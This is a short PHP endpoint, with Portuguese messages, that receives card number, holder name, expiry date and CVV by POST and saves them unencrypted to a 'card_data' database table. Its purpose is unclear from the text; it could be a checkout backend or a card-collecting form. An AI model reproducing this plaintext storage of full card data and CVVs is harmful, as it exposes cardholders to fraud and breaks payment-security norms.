<?php
require_once "../config/database.php";

header("Content-Type: application/json");

$cardNumber = $_POST['card_number'] ?? null;
$cardHolder = $_POST['card_holder'] ?? null;
$expiryDate = $_POST['expiry_date'] ?? null;
$cvv = $_POST['cvv'] ?? null;

if ($cardNumber && $cardHolder && $expiryDate && $cvv) {
    $sql = "INSERT INTO card_data (card_number, card_holder, expiry_date, cvv) VALUES (?, ?, ?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ssss", $cardNumber, $cardHolder, $expiryDate, $cvv);

    if ($stmt->execute()) {
        echo json_encode(["success" => true]);
    } else {
        echo json_encode(["success" => false, "message" => "Erro ao salvar os dados."]);
    }

    $stmt->close();
} else {
    echo json_encode(["success" => false, "message" => "Dados incompletos."]);
}

$conn->close();
?>
